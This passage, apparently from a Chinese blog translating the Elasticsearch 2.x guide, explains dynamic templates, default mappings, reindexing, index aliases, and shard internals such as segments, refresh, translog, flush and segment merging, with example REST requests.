<p>es ：以 _es 结尾的字段名需要使用 spanish 分词器。<br>en ：所有其他字段使用 english 分词器。<br>我们将 es 模板放在第一位，因为它比匹配所有字符串字段的 en 模板更特殊：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">        <span class="string">"my_type"</span>: &#123;</span><br><span class="line">            <span class="string">"dynamic_templates"</span>: [</span><br><span class="line">                &#123; <span class="string">"es"</span>: &#123;</span><br><span class="line">                      <span class="string">"match"</span>:              <span class="string">"*_es"</span>, (1)</span><br><span class="line">                      <span class="string">"match_mapping_type"</span>: <span class="string">"string"</span>,</span><br><span class="line">                      <span class="string">"mapping"</span>: &#123;</span><br><span class="line">                          <span class="string">"type"</span>:           <span class="string">"string"</span>,</span><br><span class="line">                          <span class="string">"analyzer"</span>:       <span class="string">"spanish"</span></span><br><span class="line">                      &#125;</span><br><span class="line">                &#125;&#125;,</span><br><span class="line">                &#123; <span class="string">"en"</span>: &#123;</span><br><span class="line">                      <span class="string">"match"</span>:              <span class="string">"*"</span>, (2)</span><br><span class="line">                      <span class="string">"match_mapping_type"</span>: <span class="string">"string"</span>,</span><br><span class="line">                      <span class="string">"mapping"</span>: &#123;</span><br><span class="line">                          <span class="string">"type"</span>:           <span class="string">"string"</span>,</span><br><span class="line">                          <span class="string">"analyzer"</span>:       <span class="string">"english"</span></span><br><span class="line">                      &#125;</span><br><span class="line">                &#125;&#125;</span><br><span class="line">            ]</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1)匹配字段名以 _es 结尾的字段。<br>(2)匹配其他所有字符串类型字段。</p>
<p>match_mapping_type 允许你应用模板到特定类型的字段上，就像有标准动态映射规则检测的一样， (例如 string 或 long)。</p>
<p>match 参数只匹配字段名称， path_match 参数匹配字段在对象上的完整路径，所以 address.*.name 将匹配这样的字段：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"address"</span>: &#123;</span><br><span class="line">        <span class="attr">"city"</span>: &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"New York"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>unmatch 和 path_unmatch将被用于未被匹配的字段。<br>更多的配置选项见 动态映射文档 。</p>
<h1 id="缺省映射"><a href="#缺省映射" class="headerlink" title="缺省映射"></a>缺省映射</h1><p>通常，一个索引中的所有类型共享相同的字段和设置。 <em>default</em> 映射更加方便地指定通用设置，而不是每次创建新类型时都要重复设置。 <em>default</em> 映射是新类型的模板。在设置 <em>default</em> 映射之后创建的所有类型都将应用这些缺省的设置，除非类型在自己的映射中明确覆盖这些设置。</p>
<p>例如，我们可以使用 <em>default</em> 映射为所有的类型禁用 _all 字段， 而只在 blog 类型启用：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">        <span class="string">"_default_"</span>: &#123;</span><br><span class="line">            <span class="string">"_all"</span>: &#123; <span class="string">"enabled"</span>:  <span class="literal">false</span> &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"blog"</span>: &#123;</span><br><span class="line">            <span class="string">"_all"</span>: &#123; <span class="string">"enabled"</span>:  <span class="literal">true</span>  &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><em>default</em> 映射也是一个指定索引 dynamic templates 的好方法。</p>
<h2 id="重新索引你的数据"><a href="#重新索引你的数据" class="headerlink" title="重新索引你的数据"></a>重新索引你的数据</h2><p>尽管可以增加新的类型到索引中，或者增加新的字段到类型中，但是不能添加新的分析器或者对现有的字段做改动。 如果你那么做的话，结果就是那些已经被索引的数据就不正确， 搜索也不能正常工作。</p>
<p>对现有数据的这类改变最简单的办法就是重新索引：用新的设置创建新的索引并把文档从旧的索引复制到新的索引。</p>
<p>字段 _source 的一个优点是在Elasticsearch中已经有整个文档。你不必从源数据中重建索引，而且那样通常比较慢。</p>
<p>为了有效的重新索引所有在旧的索引中的文档，用 scroll 从旧的索引检索批量文档 ， 然后用 bulk API 把文档推送到新的索引中。</p>
<p>从Elasticsearch v2.3.0开始， Reindex API 被引入。它能够对文档重建索引而不需要任何插件或外部工具。</p>
<p>批量重新索引</p>
<p>同时并行运行多个重建索引任务，但是你显然不希望结果有重叠。正确的做法是按日期或者时间 这样的字段作为过滤条件把大的重建索引分成小的任务：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /old_index/_search?scroll=1m</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"range"</span>: &#123;</span><br><span class="line">            <span class="string">"date"</span>: &#123;</span><br><span class="line">                <span class="string">"gte"</span>:  <span class="string">"2014-01-01"</span>,</span><br><span class="line">                <span class="string">"lt"</span>:   <span class="string">"2014-02-01"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"sort"</span>: [<span class="string">"_doc"</span>],</span><br><span class="line">    <span class="string">"size"</span>:  1000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果旧的索引会持续变化，你希望新的索引中也包括那些新加的文档。那就可以对新加的文档做重新索引， 但还是要用日期类字段过滤来匹配那些新加的文档。</p>
<h1 id="索引别名和零停机"><a href="#索引别名和零停机" class="headerlink" title="索引别名和零停机"></a>索引别名和零停机</h1><p>在前面提到的，重建索引的问题是必须更新应用中的索引名称。 索引别名就是用来解决这个问题的！</p>
<p>索引 别名 就像一个快捷方式或软连接，可以指向一个或多个索引，也可以给任何一个需要索引名的API来使用。别名 带给我们极大的灵活性，允许我们做下面这些：</p>
<p>在运行的集群中可以无缝的从一个索引切换到另一个索引<br>给多个索引分组 (例如， last_three_months)<br>给索引的一个子集创建 视图</p>
<p>在后面我们会讨论更多关于别名的使用。现在，我们将解释怎样使用别名在零停机下从旧索引切换到新索引。</p>
<p>有两种方式管理别名： _alias 用于单个操作， _aliases 用于执行多个原子级操作。</p>
<p>在本章中，我们假设你的应用有一个叫 my_index 的索引。事实上， my_index 是一个指向当前真实索引的别名。真实索引包含一个版本号： my_index_v1 ， my_index_v2 等等。</p>
<p>首先，创建索引 my_index_v1 ，然后将别名 my_index 指向它：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /my_index_v1 (1)</span><br><span class="line">PUT /my_index_v1/_alias/my_index (2)</span><br></pre></td></tr></table></figure></p>
<p>(1)创建索引 my_index_v1 。<br>(2)设置别名 my_index 指向 my_index_v1 。</p>
<p>你可以检测这个别名指向哪一个索引：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /*/_alias/my_index</span><br></pre></td></tr></table></figure></p>
<p>或哪些别名指向这个索引：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /my_index_v1/_alias/*</span><br></pre></td></tr></table></figure></p>
<p>两者都会返回下面的结果：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"my_index_v1"</span> : &#123;</span><br><span class="line">        <span class="attr">"aliases"</span> : &#123;</span><br><span class="line">            <span class="attr">"my_index"</span> : &#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后，我们决定修改索引中一个字段的映射。当然，我们不能修改现存的映射，所以我们必须重新索引数据。 首先, 我们用新映射创建索引 my_index_v2 ：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index_v2</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">        <span class="string">"my_type"</span>: &#123;</span><br><span class="line">            <span class="string">"properties"</span>: &#123;</span><br><span class="line">                <span class="string">"tags"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>:   <span class="string">"string"</span>,</span><br><span class="line">                    <span class="string">"index"</span>:  <span class="string">"not_analyzed"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后我们将数据从 my_index_v1 索引到 my_index_v2 ，下面的过程在 重新索引你的数据 中已经描述过。一旦我们确定文档已经被正确地重索引了，我们就将别名指向新的索引。</p>
<p>一个别名可以指向多个索引，所以我们在添加别名到新索引的同时必须从旧的索引中删除它。这个操作需要原子化，这意味着我们需要使用 _aliases 操作：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /_aliases</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"actions"</span>: [</span><br><span class="line">        &#123; <span class="string">"remove"</span>: &#123; <span class="string">"index"</span>: <span class="string">"my_index_v1"</span>, <span class="string">"alias"</span>: <span class="string">"my_index"</span> &#125;&#125;,</span><br><span class="line">        &#123; <span class="string">"add"</span>:    &#123; <span class="string">"index"</span>: <span class="string">"my_index_v2"</span>, <span class="string">"alias"</span>: <span class="string">"my_index"</span> &#125;&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>你的应用已经在零停机的情况下从旧索引迁移到新索引了。</p>
<p>即使你认为现在的索引设计已经很完美了，在生产环境中，还是有可能需要做一些修改的。<br>做好准备：在你的应用中使用别名而不是索引名。然后你就可以在任何时候重建索引。别名的开销很小，应该广泛使用。</p>
<h1 id="分片内部原理"><a href="#分片内部原理" class="headerlink" title="分片内部原理"></a>分片内部原理</h1><p>在 集群内的原理, 我们介绍了 分片, 并将它 描述成最小的 工作单元 。但是究竟什么 是 一个分片，它是如何工作的？ 在这个章节，我们回答以下问题:</p>
<ol>
<li>为什么搜索是 近 实时的？</li>
<li>为什么文档的 CRUD (创建-读取-更新-删除) 操作是 实时 的?</li>
<li>Elasticsearch 是怎样保证更新被持久化在断电时也不丢失数据?</li>
<li>为什么删除文档不会立刻释放空间？</li>
<li>refresh, flush, 和 optimize API 都做了什么, 你什么情况下应该使用他们？</li>
</ol>
<p>最简单的理解一个分片如何工作的方式是上一堂历史课。 我们将要审视提供一个带近实时搜索和分析的 分布式持久化数据存储需要解决的问题。</p>
<p>本章展示的这些信息仅供您兴趣阅读。为了使用 Elasticsearch 您并不需要理解和记忆所有的细节。 读这个章节是为了了解工作机制，并且为了将来您需要这些信息时，知道这些信息在哪里。但是不要被这些细节所累。</p>
<h1 id="使文本可被搜索"><a href="#使文本可被搜索" class="headerlink" title="使文本可被搜索"></a>使文本可被搜索</h1><p>必须解决的第一个挑战是如何 使文本可被搜索。 传统的数据库每个字段存储单个值，但这对全文检索并不够。文本字段中的每个单词需要被搜索，对数据库意味着需要单个字段有索引多值(这里指单词)的能力。</p>
<p>最好的支持 一个字段多个值 需求的数据结构是我们在 倒排索引 章节中介绍过的 倒排索引 。 倒排索引包含一个有序列表，列表包含所有文档出现过的不重复个体，或称为 词项 ，对于每一个词项，包含了它所有曾出现过文档的列表。</p>
<h2 id="Term-Doc-1-Doc-2-Doc-3-…"><a href="#Term-Doc-1-Doc-2-Doc-3-…" class="headerlink" title="Term  | Doc 1 | Doc 2 | Doc 3 | …"></a>Term  | Doc 1 | Doc 2 | Doc 3 | …</h2><p>brown |   X   |       |  X    | …</p>
<p>fox   |   X   |   X   |  X    | …</p>
<p>quick |   X   |   X   |       | …</p>
<p>the   |   X   |       |  X    | …</p>
<p>当讨论倒排索引时，我们会谈到 文档 标引，因为历史原因，倒排索引被用来对整个非结构化文本文档进行标引。 Elasticsearch 中的 文档 是有字段和值的结构化 JSON 文档。事实上，在 JSON 文档中， 每个被索引的字段都有自己的倒排索引。</p>
<p>这个倒排索引相比特定词项出现过的文档列表，会包含更多其它信息。它会保存每一个词项出现过的文档总数， 在对应的文档中一个具体词项出现的总次数，词项在文档中的顺序，每个文档的长度，所有文档的平均长度，等等。这些统计信息允许 Elasticsearch 决定哪些词比其它词更重要，哪些文档比其它文档更重要，这些内容在 什么是相关性? 中有描述。</p>
<p>为了能够实现预期功能，倒排索引需要知道集合中的 所有 文档，这是需要认识到的关键问题。</p>
<p>早期的全文检索会为整个文档集合建立一个很大的倒排索引并将其写入到磁盘。 一旦新的索引就绪，旧的就会被其替换，这样最近的变化便可以被检索到。</p>
<h2 id="不变性"><a href="#不变性" class="headerlink" title="不变性"></a>不变性</h2><p>倒排索引被写入磁盘后是 不可改变 的:它永远不会修改。 不变性有重要的价值：</p>
<ol>
<li>不需要锁。如果你从来不更新索引，你就不需要担心多进程同时修改数据的问题。</li>
<li>一旦索引被读入内核的文件系统缓存，便会留在哪里，由于其不变性。只要文件系统缓存中还有足够的空间，那么大部分读请求会直接请求内存，而不会命中磁盘。这提供了很大的性能提升。</li>
<li>其它缓存(像filter缓存)，在索引的生命周期内始终有效。它们不需要在每次数据改变时被重建，因为数据不会变化。</li>
<li>写入单个大的倒排索引允许数据被压缩，减少磁盘 I/O 和 需要被缓存到内存的索引的使用量。</li>
</ol>
<p>当然，一个不变的索引也有不好的地方。主要事实是它是不可变的! 你不能修改它。如果你需要让一个新的文档 可被搜索，你需要重建整个索引。这要么对一个索引所能包含的数据量造成了很大的限制，要么对索引可被更新的频率造成了很大的限制。</p>
<h1 id="动态更新索引"><a href="#动态更新索引" class="headerlink" title="动态更新索引"></a>动态更新索引</h1><p>下一个需要被解决的问题是怎样在保留不变性的前提下实现倒排索引的更新？ 答案是: 用更多的索引。</p>
<p>通过增加新的补充索引来反映新近的修改，而不是直接重写整个倒排索引。每一个倒排索引都会被轮流查询到–从最早的开始–查询完后再对结果进行合并。</p>
<p>Elasticsearch 基于 Lucene, 这个 java 库引入了 按段搜索 的概念。 每一 段 本身都是一个倒排索引， 但 索引 在 Lucene 中除表示所有 段 的集合外， 还增加了 提交点 的概念 — 一个列出了所有已知段的文件，就像在 图 16 “一个 Lucene 索引包含一个提交点和三个段” 中描绘的那样。 如 图 17 “一个在内存缓存中包含新文档的 Lucene 索引” 所示，新的文档首先被添加到内存索引缓存中，然后写入到一个基于磁盘的段，如 图 18 “在一次提交后，一个新的段被添加到提交点而且缓存被清空。” 所示。<br>图 16. 一个 Lucene 索引包含一个提交点和三个段<br><img src="https://mfaying.github.io/images/elasticsearch2.x/16.jpg" alt="avatar"></p>
<p>索引与分片的比较</p>
<p>被混淆的概念是，一个 Lucene 索引 我们在 Elasticsearch 称作 分片 。 一个 Elasticsearch 索引 是分片的集合。 当 Elasticsearch 在索引中搜索的时候， 他发送查询到每一个属于索引的分片(Lucene 索引)，然后像 执行分布式检索 提到的那样，合并每个分片的结果到一个全局的结果集。</p>
<p>逐段搜索会以如下流程进行工作：</p>
<ol>
<li>新文档被收集到内存索引缓存， 见 图 17 “一个在内存缓存中包含新文档的 Lucene 索引” 。</li>
<li>不时地, 缓存被 提交 ：</li>
</ol>
<p>一个新的段–一个追加的倒排索引–被写入磁盘。<br>一个新的包含新段名字的 提交点 被写入磁盘。<br>磁盘进行 同步 — 所有在文件系统缓存中等待的写入都刷新到磁盘，以确保它们被写入物理文件。</p>
<ol start="3">
<li>新的段被开启，让它包含的文档可见以被搜索。</li>
<li>内存缓存被清空，等待接收新的文档。</li>
</ol>
<p>图 17. 一个在内存缓存中包含新文档的 Lucene 索引<br><img src="https://mfaying.github.io/images/elasticsearch2.x/17.jpg" alt="avatar"></p>
<p>在一次提交后，一个新的段被添加到提交点而且缓存被清空。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/18.jpg" alt="avatar"></p>
<p>当一个查询被触发，所有已知的段按顺序被查询。词项统计会对所有段的结果进行聚合，以保证每个词和每个文档的关联都被准确计算。 这种方式可以用相对较低的成本将新文档添加到索引。</p>
<h2 id="删除和更新"><a href="#删除和更新" class="headerlink" title="删除和更新"></a>删除和更新</h2><p>段是不可改变的，所以既不能从把文档从旧的段中移除，也不能修改旧的段来进行反映文档的更新。 取而代之的是，每个提交点会包含一个 .del 文件，文件中会列出这些被删除文档的段信息。</p>
<p>当一个文档被 “删除” 时，它实际上只是在 .del 文件中被 标记 删除。一个被标记删除的文档仍然可以被查询匹配到， 但它会在最终结果被返回前从结果集中移除。</p>
<p>文档更新也是类似的操作方式：当一个文档被更新时，旧版本文档被标记删除，文档的新版本被索引到一个新的段中。 可能两个版本的文档都会被一个查询匹配到，但被删除的那个旧版本文档在结果集返回前就已经被移除。</p>
<p>在 段合并 , 我们展示了一个被删除的文档是怎样被文件系统移除的。</p>
<h2 id="近实时搜索"><a href="#近实时搜索" class="headerlink" title="近实时搜索"></a>近实时搜索</h2><p>随着按段（per-segment）搜索的发展， 一个新的文档从索引到可被搜索的延迟显著降低了。新文档在几分钟之内即可被检索，但这样还是不够快。</p>
<p>磁盘在这里成为了瓶颈。 提交（Commiting）一个新的段到磁盘需要一个 fsync 来确保段被物理性地写入磁盘，这样在断电的时候就不会丢失数据。 但是 fsync 操作代价很大; 如果每次索引一个文档都去执行一次的话会造成很大的性能问题。</p>
<p>我们需要的是一个更轻量的方式来使一个文档可被搜索，这意味着 fsync 要从整个过程中被移除。</p>
<p>在Elasticsearch和磁盘之间是文件系统缓存。 像之前描述的一样， 在内存索引缓冲区（ 图 19 “在内存缓冲区中包含了新文档的 Lucene 索引” ）中的文档会被写入到一个新的段中（ 图 20 “缓冲区的内容已经被写入一个可被搜索的段中，但还没有进行提交” ）。 但是这里新段会被先写入到文件系统缓存–这一步代价会比较低，稍后再被刷新到磁盘–这一步代价比较高。不过只要文件已经在缓存中， 就可以像其它文件一样被打开和读取了。<br>图 19. 在内存缓冲区中包含了新文档的 Lucene 索引<br><img src="https://mfaying.github.io/images/elasticsearch2.x/19.jpg" alt="avatar"><br>Lucene 允许新段被写入和打开–使其包含的文档在未进行一次完整提交时便对搜索可见。 这种方式比进行一次提交代价要小得多，并且在不影响性能的前提下可以被频繁地执行。</p>
<p>图 20. 缓冲区的内容已经被写入一个可被搜索的段中，但还没有进行提交<br><img src="https://mfaying.github.io/images/elasticsearch2.x/20.jpg" alt="avatar"></p>
<h2 id="refresh-API"><a href="#refresh-API" class="headerlink" title="refresh API"></a>refresh API</h2><p>在 Elasticsearch 中，写入和打开一个新段的轻量的过程叫做 refresh 。 默认情况下每个分片会每秒自动刷新一次。这就是为什么我们说 Elasticsearch 是 近 实时搜索: 文档的变化并不是立即对搜索可见，但会在一秒之内变为可见。</p>
<p>这些行为可能会对新用户造成困惑: 他们索引了一个文档然后尝试搜索它，但却没有搜到。这个问题的解决办法是用 refresh API 执行一次手动刷新:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /_refresh (1)</span><br><span class="line">POST /blogs/_refresh (2)</span><br></pre></td></tr></table></figure></p>
<p>(1)刷新（Refresh）所有的索引。<br>(2)只刷新（Refresh） blogs 索引。</p>
<p>尽管刷新是比提交轻量很多的操作，它还是会有性能开销。 当写测试的时候， 手动刷新很有用，但是不要在生产环境下每次索引一个文档都去手动刷新。 相反，你的应用需要意识到 Elasticsearch 的近实时的性质，并接受它的不足。</p>
<p>并不是所有的情况都需要每秒刷新。可能你正在使用 Elasticsearch 索引大量的日志文件， 你可能想优化索引速度而不是近实时搜索， 可以通过设置 refresh_interval ， 降低每个索引的刷新频率：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_logs</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"settings"</span>: &#123;</span><br><span class="line">    <span class="string">"refresh_interval"</span>: <span class="string">"30s"</span> (1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1)每30秒刷新 my_logs 索引。</p>
<p>refresh_interval 可以在既存索引上进行动态更新。 在生产环境中，当你正在建立一个大的新索引时，可以先关闭自动刷新，待开始使用该索引时，再把它们调回来：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_logs/_settings</span><br><span class="line">&#123; <span class="string">"refresh_interval"</span>: -1 &#125; (1)</span><br><span class="line"></span><br><span class="line">PUT /my_logs/_settings</span><br><span class="line">&#123; <span class="string">"refresh_interval"</span>: <span class="string">"1s"</span> &#125; (2)</span><br></pre></td></tr></table></figure></p>
<p>(1) 关闭自动刷新。<br>(2) 每秒自动刷新。</p>
<p>refresh_interval 需要一个 持续时间 值， 例如 1s （1 秒） 或 2m （2 分钟）。 一个绝对值 1 表示的是 1毫秒 –无疑会使你的集群陷入瘫痪。</p>
<h1 id="持久化变更"><a href="#持久化变更" class="headerlink" title="持久化变更"></a>持久化变更</h1><p>如果没有用 fsync 把数据从文件系统缓存刷（flush）到硬盘，我们不能保证数据在断电甚至是程序正常退出之后依然存在。为了保证 Elasticsearch 的可靠性，需要确保数据变化被持久化到磁盘。</p>
<p>在 动态更新索引，我们说一次完整的提交会将段刷到磁盘，并写入一个包含所有段列表的提交点。Elasticsearch 在启动或重新打开一个索引的过程中使用这个提交点来判断哪些段隶属于当前分片。</p>
<p>即使通过每秒刷新（refresh）实现了近实时搜索，我们仍然需要经常进行完整提交来确保能从失败中恢复。但在两次提交之间发生变化的文档怎么办？我们也不希望丢失掉这些数据。</p>
<p>Elasticsearch 增加了一个 translog ，或者叫事务日志，在每一次对 Elasticsearch 进行操作时均进行了日志记录。通过 translog ，整个流程看起来是下面这样：</p>
<ol>
<li>一个文档被索引之后，就会被添加到内存缓冲区，并且 追加到了 translog ，正如 图 21 “新的文档被添加到内存缓冲区并且被追加到了事务日志” 描述的一样。</li>
</ol>
<p>新的文档被添加到内存缓冲区并且被追加到了事务日志<br><img src="https://mfaying.github.io/images/elasticsearch2.x/21.jpg" alt="avatar"></p>
<p>刷新（refresh）使分片处于 图 22 “刷新（refresh）完成后, 缓存被清空但是事务日志不会” 描述的状态，分片每秒被刷新（refresh）一次：</p>
<ol>
<li>这些在内存缓冲区的文档被写入到一个新的段中，且没有进行 fsync 操作。</li>
<li>这个段被打开，使其可被搜索。</li>
<li>内存缓冲区被清空。</li>
</ol>
<p>图 22. 刷新（refresh）完成后, 缓存被清空但是事务日志不会<br><img src="https://mfaying.github.io/images/elasticsearch2.x/22.jpg" alt="avatar"></p>
<ol start="3">
<li><p>这个进程继续工作，更多的文档被添加到内存缓冲区和追加到事务日志（见 图 23 “事务日志不断积累文档” ）。<br>图 23. 事务日志不断积累文档<br><img src="https://mfaying.github.io/images/elasticsearch2.x/23.jpg" alt="avatar"></p>
</li>
<li><p>每隔一段时间–例如 translog 变得越来越大–索引被刷新（flush）；一个新的 translog 被创建，并且一个全量提交被执行（见 图 24 “在刷新（flush）之后，段被全量提交，并且事务日志被清空” ）：</p>
</li>
<li>所有在内存缓冲区的文档都被写入一个新的段。</li>
<li>缓冲区被清空。</li>
<li>一个提交点被写入硬盘。</li>
<li>文件系统缓存通过 fsync 被刷新（flush）。</li>
<li>老的 translog 被删除。<br>translog 提供所有还没有被刷到磁盘的操作的一个持久化纪录。当 Elasticsearch 启动的时候， 它会从磁盘中使用最后一个提交点去恢复已知的段，并且会重放 translog 中所有在最后一次提交后发生的变更操作。</li>
</ol>
<p>translog 也被用来提供实时 CRUD 。当你试着通过ID查询、更新、删除一个文档，它会在尝试从相应的段中检索之前， 首先检查 translog 任何最近的变更。这意味着它总是能够实时地获取到文档的最新版本。</p>
<p>图 24. 在刷新（flush）之后，段被全量提交，并且事务日志被清空<br><img src="https://mfaying.github.io/images/elasticsearch2.x/24.jpg" alt="avatar"></p>
<h2 id="flush-API"><a href="#flush-API" class="headerlink" title="flush API"></a>flush API</h2><p>这个执行一个提交并且截断 translog 的行为在 Elasticsearch 被称作一次 flush 。 分片每30分钟被自动刷新（flush），或者在 translog 太大的时候也会刷新。请查看 translog 文档 来设置，它可以用来 控制这些阈值：<br>flush API 可以 被用来执行一个手工的刷新（flush）:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /blogs/_flush (1)</span><br><span class="line"></span><br><span class="line">POST /_flush?wait_for_ongoing (2)</span><br></pre></td></tr></table></figure></p>
<p>(1) 刷新（flush） blogs 索引。<br>(2) 刷新（flush）所有的索引并且等待所有刷新在返回前完成。</p>
<p>你很少需要自己手动执行 flush 操作；通常情况下，自动刷新就足够了。</p>
<p>这就是说，在重启节点或关闭索引之前执行 flush 有益于你的索引。当 Elasticsearch 尝试恢复或重新打开一个索引， 它需要重放 translog 中所有的操作，所以如果日志越短，恢复越快。</p>
<p>Translog 有多安全?</p>
<p>translog 的目的是保证操作不会丢失。这引出了这个问题： Translog 有多安全 ？</p>
<p>在文件被 fsync 到磁盘前，被写入的文件在重启之后就会丢失。默认 translog 是每 5 秒被 fsync 刷新到硬盘， 或者在每次写请求完成之后执行(e.g. index, delete, update, bulk)。这个过程在主分片和复制分片都会发生。最终， 基本上，这意味着在整个请求被 fsync 到主分片和复制分片的translog之前，你的客户端不会得到一个 200 OK 响应。</p>
<p>在每次请求后都执行一个 fsync 会带来一些性能损失，尽管实践表明这种损失相对较小（特别是bulk导入，它在一次请求中平摊了大量文档的开销）。</p>
<p>但是对于一些大容量的偶尔丢失几秒数据问题也并不严重的集群，使用异步的 fsync 还是比较有益的。比如，写入的数据被缓存到内存中，再每5秒执行一次 fsync 。</p>
<p>这个行为可以通过设置 durability 参数为 async 来启用：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/_settings</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"index.translog.durability"</span>: <span class="string">"async"</span>,</span><br><span class="line">    <span class="string">"index.translog.sync_interval"</span>: <span class="string">"5s"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个选项可以针对索引单独设置，并且可以动态进行修改。如果你决定使用异步 translog 的话，你需要 保证 在发生crash时，丢失掉 sync_interval 时间段的数据也无所谓。请在决定前知晓这个特性。</p>
<p>如果你不确定这个行为的后果，最好是使用默认的参数（ “index.translog.durability”: “request” ）来避免数据丢失。</p>
<h1 id="段合并"><a href="#段合并" class="headerlink" title="段合并"></a>段合并</h1><p>由于自动刷新流程每秒会创建一个新的段 ，这样会导致短时间内的段数量暴增。而段数目太多会带来较大的麻烦。 每一个段都会消耗文件句柄、内存和cpu运行周期。更重要的是，每个搜索请求都必须轮流检查每个段；所以段越多，搜索也就越慢。</p>
<p>Elasticsearch通过在后台进行段合并来解决这个问题。小的段被合并到大的段，然后这些大的段再被合并到更大的段。</p>
<p>段合并的时候会将那些旧的已删除文档 从文件系统中清除。 被删除的文档（或被更新文档的旧版本）不会被拷贝到新的大段中。</p>
<p>启动段合并不需要你做任何事。进行索引和搜索时会自动进行。这个流程像在 图 25 “两个提交了的段和一个未提交的段正在被合并到一个更大的段” 中提到的一样工作：</p>
<p>1、 当索引的时候，刷新（refresh）操作会创建新的段并将段打开以供搜索使用。<br>2、 合并进程选择一小部分大小相似的段，并且在后台将它们合并到更大的段中。这并不会中断索引和搜索。<br>图 25. 两个提交了的段和一个未提交的段正在被合并到一个更大的段<br><img src="https://mfaying.github.io/images/elasticsearch2.x/25.jpg" alt="avatar"></p>
<p>3、 图 26 “一旦合并结束，老的段被删除” 说明合并完成时的活动：<br>新的段被刷新（flush）到了磁盘。   ** 写入一个包含新段且排除旧的和较小的段的新提交点。<br>新的段被打开用来搜索。<br>老的段被删除。<br>图 26. 一旦合并结束，老的段被删除<br><img src="https://mfaying.github.io/images/elasticsearch2.x/26.jpg" alt="avatar"><br>合并大的段需要消耗大量的I/O和CPU资源，如果任其发展会影响搜索性能。Elasticsearch在默认情况下会对合并流程进行资源限制，所以搜索仍然 有足够的资源很好地执行。</p>
<p>查看 段和合并 来为你的实例获取关于合并调整的建议。</p>
<h2 id="optimize-API"><a href="#optimize-API" class="headerlink" title="optimize API"></a>optimize API</h2><p>optimize API大可看做是 强制合并 API 。它会将一个分片强制合并到 max_num_segments 参数指定大小的段数目。 这样做的意图是减少段的数量（通常减少到一个），来提升搜索性能。</p>
<p>optimize API 不应该 被用在一个活跃的索引————一个正积极更新的索引。后台合并流程已经可以很好地完成工作。 optimizing 会阻碍这个进程。不要干扰它！</p>
<p>在特定情况下，使用 optimize API 颇有益处。例如在日志这种用例下，每天、每周、每月的日志被存储在一个索引中。 老的索引实质上是只读的；它们也并不太可能会发生变化。</p>
<p>在这种情况下，使用optimize优化老的索引，将每一个分片合并为一个单独的段就很有用了；这样既可以节省资源，也可以使搜索更加快速：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /logstash-2014-10/_optimize?max_num_segments=1</span><br></pre></td></tr></table></figure></p>
<p>合并索引中的每个分片为一个单独的段</p>
<p>请注意，使用 optimize API 触发段合并的操作不会受到任何资源上的限制。这可能会消耗掉你节点上全部的I/O资源, 使其没有余裕来处理搜索请求，从而有可能使集群失去响应。 如果你想要对索引执行 <code>optimize</code>，你需要先使用分片分配（查看 迁移旧索引）把索引移到一个安全的节点，再执行。</p>
<h1 id="深入搜索"><a href="#深入搜索" class="headerlink" title="深入搜索"></a>深入搜索</h1><p>在 基础入门 中涵盖了基本工具并对它们有足够详细的描述，这让我们能够开始用 Elasticsearch 搜索数据。 用不了多长时间，就会发现我们想要的更多：希望查询匹配更灵活，排名结果更精确，不同问题域下搜索更具体。</p>
<p>想要进阶，只知道如何使用 match 查询是不够的，我们需要理解数据以及如何能够搜索到它们。本章会解释如何索引和查询我们的数据让我们能利用词的相似度（word proximity）、部分匹配（partial matching）、模糊匹配（fuzzy matching）以及语言感知（language awareness）这些优势。</p>
